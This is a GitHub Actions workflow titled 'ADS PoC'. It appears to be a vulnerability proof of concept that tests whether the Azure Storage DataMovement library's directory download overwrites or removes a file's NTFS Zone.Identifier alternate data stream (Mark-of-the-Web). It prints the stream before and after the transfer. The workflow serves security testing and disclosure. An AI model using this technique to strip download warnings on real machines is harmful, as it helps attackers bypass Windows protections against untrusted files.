name: ADS PoC
on: workflow_dispatch
jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      - run: dotnet new console -o poc
      - run: dotnet add poc package Azure.Storage.DataMovement.Blobs
      - name: Write test program
        shell: pwsh
        run: |
          Set-Content -Path poc/Program.cs -Value @'
          using Azure;
          using Azure.Storage.Blobs;
          using Azure.Storage.DataMovement;
          using Azure.Storage.DataMovement.Blobs;

          var connStr = Environment.GetEnvironmentVariable("AZURE_STORAGE_CONNECTION_STRING");
          var container = new BlobContainerClient(connStr, "test-container");
          var dest = Path.Combine(Path.GetTempPath(), "ads-poc-" + Guid.NewGuid());
          Directory.CreateDirectory(dest);

          var preExisting = Path.Combine(dest, "legituser.exe");
          File.WriteAllBytes(preExisting, new byte[]{0x4D,0x5A});
          File.WriteAllText(preExisting + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\n");

          Console.WriteLine("--- BEFORE ---");
          Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier"));

          var options = new BlobContainerClientTransferOptions
          {
              TransferOptions = new TransferOptions { CreationMode = StorageResourceCreationMode.OverwriteIfExists }
          };
          var transfer = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest, options);
          Console.WriteLine($"TRANSFER_STATE={transfer.Status.State}");
          Console.WriteLine($"HAS_FAILED_ITEMS={transfer.Status.HasFailedItems}");

          Console.WriteLine("--- AFTER ---");
          try { Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier")); }
          catch (Exception ex) { Console.WriteLine($"ERROR: {ex.Message}"); }
          '@
      - name: Run download
        shell: pwsh
        run: dotnet run --project poc
        env:
          AZURE_STORAGE_CONNECTION_STRING: ${{ secrets.AZURE_STORAGE_CONNECTION_STRING }}
